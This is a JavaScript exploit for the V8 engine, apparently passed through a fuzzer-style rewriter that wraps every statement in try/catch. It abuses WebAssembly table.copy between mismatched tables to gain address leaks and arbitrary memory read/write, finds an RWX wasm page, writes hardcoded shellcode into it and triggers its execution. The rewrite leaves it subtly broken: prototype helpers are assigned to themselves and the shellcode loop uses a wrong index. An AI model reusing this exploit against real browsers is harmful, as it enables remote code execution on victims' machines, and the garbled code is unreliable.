try {
    try {
        try { load("../../v8/v8/test/mjsunit/wasm/wasm-module-builder.js"); } catch (e) {}
    } catch(e3) {
    }
    let v5;
    try {
        const v8 = new ArrayBuffer(8);
        v5 = v8;
    } catch(e9) {
    }
    let conversion_buffer = v5;
    let v8;
    try {
        const v14 = new Float64Array(conversion_buffer);
        v8 = v14;
    } catch(e15) {
    }
    let float_view = v8;
    let v11;
    try {
        const v20 = new BigUint64Array(conversion_buffer);
        v11 = v20;
    } catch(e21) {
    }
    let int_view = v11;
    function f13() {
        let v17;
        try {
            let v28;
            try { v28 = this.toString(16); } catch (e) {}
            v17 = v28;
        } catch(e29) {
        }
        return "0x" + v17;
    }
    const t16 = BigInt.prototype;
    t16.hex = t16;
    function f21() {
        int_view[0] = this;
        return float_view?.[0];
    }
    const t22 = BigInt.prototype;
    t22.i2f = t22;
    function f25() {
        int_view[0] = this << 32n;
        return float_view?.[0];
    }
    const t28 = BigInt.prototype;
    t28.smi2f = t28;
    function f31() {
        float_view[0] = this;
        return int_view?.[0];
    }
    const t34 = Number.prototype;
    t34.f2i = t34;
    function f36() {
        float_view[0] = this;
        return int_view?.[0] >> 32n;
    }
    const t40 = Number.prototype;
    t40.f2smi = t40;
    function f42() {
        let v44;
        try {
            let v64;
            try { v64 = BigInt(this); } catch (e) {}
            v44 = v64;
        } catch(e65) {
        }
        let v45;
        try {
            let v68;
            try { v68 = v44.i2f(); } catch (e) {}
            v45 = v68;
        } catch(e69) {
        }
        return v45;
    }
    const t49 = Number.prototype;
    t49.i2f = t49;
    function f47() {
        let v49;
        try {
            let v76;
            try { v76 = BigInt(this); } catch (e) {}
            v49 = v76;
        } catch(e77) {
        }
        let v50;
        try {
            let v80;
            try { v80 = v49.smi2f(); } catch (e) {}
            v50 = v80;
        } catch(e81) {
        }
        return v50;
    }
    const t58 = Number.prototype;
    t58.smi2f = t58;
    let instance;
    let instance2;
    const v57 = WebAssembly.Table;
    const v61 = { initial: 16, maximum: 16, element: "anyfunc" };
    let v62;
    try {
        const v98 = new v57(v61);
        v62 = v98;
    } catch(e99) {
    }
    let table1 = v62;
    const v64 = WebAssembly.Table;
    const v68 = { initial: 256, maximum: 256, element: "anyfunc" };
    let v69;
    try {
        const v110 = new v64(v68);
        v69 = v110;
    } catch(e111) {
    }
    let table2 = v69;
    let a;
    let b;
    let c;
    let d;
    {
        let v80;
        try {
            let v124;
            try { v124 = new WasmModuleBuilder(); } catch (e) {}
            v80 = v124;
        } catch(e125) {
        }
        let builder = v80;
        let v83;
        try {
            let v130;
            try { v130 = builder.addType(kSig_i_i); } catch (e) {}
            v83 = v130;
        } catch(e131) {
        }
        const void_sig = v83;
        let v87;
        try {
            let v137;
            try { v137 = builder.addImport("q", "func", void_sig); } catch (e) {}
            v87 = v137;
        } catch(e138) {
        }
        const func_index = v87;
        let v90;
        try {
            let v143;
            try { v143 = builder.addType(kSig_v_iii); } catch (e) {}
            v90 = v143;
        } catch(e144) {
        }
        let sig_v_iii = v90;
        try {
            try { builder.addExport("hack", func_index); } catch (e) {}
        } catch(e148) {
        }
        let v98;
        try {
            let v155;
            try { v155 = builder.addImportedTable("q", "table1", 16, 16); } catch (e) {}
            v98 = v155;
        } catch(e156) {
        }
        const table_index1 = v98;
        let v104;
        try {
            let v164;
            try { v164 = builder.addImportedTable("q", "table2", 256, 256); } catch (e) {}
            v104 = v164;
        } catch(e165) {
        }
        const table_index2 = v104;
        const v113 = [kExprGetLocal,0,kExprGetLocal,1,kExprGetLocal,2,kNumericPrefix,kExprTableCopy,table_index1,table_index1];
        let v115;
        try {
            let v178;
            try { v178 = builder.addFunction("copy", sig_v_iii); } catch (e) {}
            v115 = v178;
        } catch(e179) {
        }
        let v116;
        try {
            let v182;
            try { v182 = v115.addBody(v113); } catch (e) {}
            v116 = v182;
        } catch(e183) {
        }
        try {
            try { v116.exportAs("copy"); } catch (e) {}
        } catch(e186) {
        }
        let v118;
        try {
            let v189;
            try { v189 = builder.toModule(); } catch (e) {}
            v118 = v189;
        } catch(e190) {
        }
        let wasm_m = v118;
        const v192 = (a193) => {
            return 1;
        };
        const v120 = v192;
        let func = v120;
        const v124 = WebAssembly?.Instance;
        const v125 = { table1: table1, table2: table2, func: func };
        const v126 = { q: v125 };
        let v127;
        try {
            let v205;
            try { v205 = new v124(wasm_m, v126); } catch (e) {}
            v127 = v205;
        } catch(e206) {
        }
        instance = v127;
        a = [0.1,0.1,0.1,0.1,0.1,0.1];
        b = [1.1,1.2,1.3,1.4,1.5];
        c = [{},2.2,2.3,2.4,2.5,2.6,2.7,2.8];
        d = [3.1,3.2,3.3,3.4];
    }
    {
        let v156;
        try {
            let v237;
            try { v237 = new WasmModuleBuilder(); } catch (e) {}
            v156 = v237;
        } catch(e238) {
        }
        let builder = v156;
        let v159;
        try {
            let v243;
            try { v243 = builder.addType(kSig_i_i); } catch (e) {}
            v159 = v243;
        } catch(e244) {
        }
        const void_sig = v159;
        let v163;
        try {
            let v250;
            try { v250 = builder.addImport("q", "func", void_sig); } catch (e) {}
            v163 = v250;
        } catch(e251) {
        }
        const func_index = v163;
        let v166;
        try {
            let v256;
            try { v256 = builder.addType(kSig_v_iii); } catch (e) {}
            v166 = v256;
        } catch(e257) {
        }
        let sig_v_iii = v166;
        try {
            try { builder.addExport("hack", func_index); } catch (e) {}
        } catch(e261) {
        }
        let v174;
        try {
            let v268;
            try { v268 = builder.addImportedTable("q", "table1", 256, 256); } catch (e) {}
            v174 = v268;
        } catch(e269) {
        }
        const table_index1 = v174;
        let v180;
        try {
            let v277;
            try { v277 = builder.addImportedTable("q", "table2", 16, 16); } catch (e) {}
            v180 = v277;
        } catch(e278) {
        }
        const table_index2 = v180;
        const v189 = [kExprGetLocal,0,kExprGetLocal,1,kExprGetLocal,2,kNumericPrefix,kExprTableCopy,table_index1,table_index1];
        let v191;
        try {
            let v291;
            try { v291 = builder.addFunction("copy", sig_v_iii); } catch (e) {}
            v191 = v291;
        } catch(e292) {
        }
        let v192;
        try {
            let v295;
            try { v295 = v191.addBody(v189); } catch (e) {}
            v192 = v295;
        } catch(e296) {
        }
        try {
            try { v192.exportAs("copy"); } catch (e) {}
        } catch(e299) {
        }
        let v194;
        try {
            let v302;
            try { v302 = builder.toModule(); } catch (e) {}
            v194 = v302;
        } catch(e303) {
        }
        let wasm_m = v194;
        const v305 = (a306) => {
            return 1;
        };
        const v196 = v305;
        let func = v196;
        const v200 = WebAssembly?.Instance;
        const v201 = { table1: table2, table2: table1, func: func };
        const v202 = { q: v201 };
        let v203;
        try {
            let v318;
            try { v318 = new v200(wasm_m, v202); } catch (e) {}
            v203 = v318;
        } catch(e319) {
        }
        instance2 = v203;
    }
    const a_index = 69;
    const b_index = 81;
    const c_index = 92;
    const a_backing_store = 69 + 8;
    const BACKING_POINTER_OFFSET = 15n;
    let old;
    function addr_of(a335) {
        c[0] = a335;
        const v221 = instance2?.exports;
        try {
            try { v221.copy(a_index, c_index, 1); } catch (e) {}
        } catch(e340) {
        }
        const v223 = a?.[0];
        let v224;
        try {
            let v345;
            try { v345 = v223.f2i(); } catch (e) {}
            v224 = v345;
        } catch(e346) {
        }
        let r = v224;
        return r;
    }
    function arb_read(a349) {
        const v229 = instance2?.exports;
        try {
            try { v229.copy(b_index, a_backing_store, 1); } catch (e) {}
        } catch(e354) {
        }
        old = b?.[0];
        const v232 = a349 - BACKING_POINTER_OFFSET;
        let v233;
        try {
            let v360;
            try { v360 = v232.i2f(); } catch (e) {}
            v233 = v360;
        } catch(e361) {
        }
        b[0] = v233;
        const v235 = instance2?.exports;
        try {
            try { v235.copy(a_backing_store, b_index, 1); } catch (e) {}
        } catch(e366) {
        }
        const v237 = a?.[0];
        let v238;
        try {
            let v371;
            try { v371 = v237.f2i(); } catch (e) {}
            v238 = v371;
        } catch(e372) {
        }
        let r = v238;
        b[0] = old;
        const v241 = instance2?.exports;
        try {
            try { v241.copy(a_backing_store, b_index, 1); } catch (e) {}
        } catch(e378) {
        }
        return r;
    }
    function arb_write(a380, a381) {
        const v247 = instance2?.exports;
        try {
            try { v247.copy(b_index, a_backing_store, 1); } catch (e) {}
        } catch(e386) {
        }
        old = b?.[0];
        const v250 = a380 - BACKING_POINTER_OFFSET;
        let v251;
        try {
            let v392;
            try { v392 = v250.i2f(); } catch (e) {}
            v251 = v392;
        } catch(e393) {
        }
        b[0] = v251;
        const v253 = instance2?.exports;
        try {
            try { v253.copy(a_backing_store, b_index, 1); } catch (e) {}
        } catch(e398) {
        }
        let v255;
        try {
            let v401;
            try { v401 = a381.i2f(); } catch (e) {}
            v255 = v401;
        } catch(e402) {
        }
        a[0] = v255;
        b[0] = old;
        const v257 = instance2?.exports;
        try {
            try { v257.copy(a_backing_store, b_index, 1); } catch (e) {}
        } catch(e407) {
        }
    }
    const v259 = {};
    let v260;
    try {
        let v412;
        try { v412 = addr_of(v259); } catch (e) {}
        v260 = v412;
    } catch(e413) {
    }
    let leak_addr = v260;
    try {
        try { arb_read(leak_addr); } catch (e) {}
    } catch(e416) {
    }
    let v263;
    try {
        let v419;
        try { v419 = old.f2i(); } catch (e) {}
        v263 = v419;
    } catch(e420) {
    }
    let test_backing = v263 + BACKING_POINTER_OFFSET;
    const v267 = test_backing + 8n;
    let v268;
    try {
        let v428;
        try { v428 = arb_read(v267); } catch (e) {}
        v268 = v428;
    } catch(e429) {
    }
    let v269;
    try {
        let v432;
        try { v432 = v268.i2f(); } catch (e) {}
        v269 = v432;
    } catch(e433) {
    }
    if (v269 != 0.1) {
        throw "[-] arb_read failed";
    }
    const v274 = test_backing + 8n;
    let v276;
    try {
        let v443;
        try { v443 = (1.337).f2i(); } catch (e) {}
        v276 = v443;
    } catch(e444) {
    }
    try {
        try { arb_write(v274, v276); } catch (e) {}
    } catch(e446) {
    }
    if (a?.[1] != 1.337) {
        throw "[-] arb_write failed";
    }
    try {
        try { console.log("[+] success arb r/w "); } catch (e) {}
    } catch(e454) {
    }
    let v285;
    try {
        let v457;
        try { v457 = addr_of(instance); } catch (e) {}
        v285 = v457;
    } catch(e458) {
    }
    wasm_i_addr = v285;
    const v292 = (17 * 8) - 1;
    let v293;
    try {
        let v468;
        try { v468 = BigInt(v292); } catch (e) {}
        v293 = v468;
    } catch(e469) {
    }
    const v294 = wasm_i_addr + v293;
    let v295;
    try {
        let v475;
        try { v475 = arb_read(v294); } catch (e) {}
        v295 = v475;
    } catch(e476) {
    }
    wasm_f_addr = v295;
    let v299;
    try {
        let v481;
        try { v481 = wasm_f_addr.hex(); } catch (e) {}
        v299 = v481;
    } catch(e482) {
    }
    const v300 = "[+] rwx page : " + v299;
    try {
        try { console.log(v300); } catch (e) {}
    } catch(e488) {
    }
    const v305 = (test_backing - 16n) + 8n;
    let v306;
    try {
        let v496;
        try { v496 = arb_read(v305); } catch (e) {}
        v306 = v496;
    } catch(e497) {
    }
    let wtf = v306;
    const v311 = (test_backing - 16n) + 8n;
    let v313;
    try {
        let v507;
        try { v507 = (4660).smi2f(); } catch (e) {}
        v313 = v507;
    } catch(e508) {
    }
    let v314;
    try {
        let v511;
        try { v511 = v313.f2i(); } catch (e) {}
        v314 = v511;
    } catch(e512) {
    }
    try {
        try { arb_write(v311, v314); } catch (e) {}
    } catch(e514) {
    }
    try { a.length = a; } catch (e) {}
    let v319;
    try {
        let v519;
        try { v519 = BigInt("0x91969dd1bb48c031"); } catch (e) {}
        v319 = v519;
    } catch(e520) {
    }
    let v322;
    try {
        let v524;
        try { v524 = BigInt("0x53dbf748ff978cd0"); } catch (e) {}
        v322 = v524;
    } catch(e525) {
    }
    let v325;
    try {
        let v529;
        try { v529 = BigInt("0xb05e545752995f54"); } catch (e) {}
        v325 = v529;
    } catch(e530) {
    }
    let v328;
    try {
        let v534;
        try { v534 = BigInt("0xcccccccccc050f3b"); } catch (e) {}
        v328 = v534;
    } catch(e535) {
    }
    let shellcode = [v319,v322,v325,v328];
    for (let i539 = 0; i539 < shellcode?.length; i539++) {
        let v340;
        try {
            let v548;
            try { v548 = BigInt("0x380"); } catch (e) {}
            v340 = v548;
        } catch(e549) {
        }
        const v341 = wasm_f_addr + v340;
        const v343 = 8 * i539;
        let v344;
        try {
            let v558;
            try { v558 = BigInt(v343); } catch (e) {}
            v344 = v558;
        } catch(e559) {
        }
        const v346 = (v341 + v344) - BACKING_POINTER_OFFSET;
        let v347;
        try {
            let v565;
            try { v565 = v346.i2f(); } catch (e) {}
            v347 = v565;
        } catch(e566) {
        }
        a[19] = v347;
        const v348 = shellcode?.[shellcode];
        let v349;
        try {
            let v571;
            try { v571 = v348.i2f(); } catch (e) {}
            v349 = v571;
        } catch(e572) {
        }
        b[0] = v349;
    }
    const v350 = instance?.exports;
    try {
        try { v350.copy(); } catch (e) {}
    } catch(e576) {
    }
} catch(e577) {
}
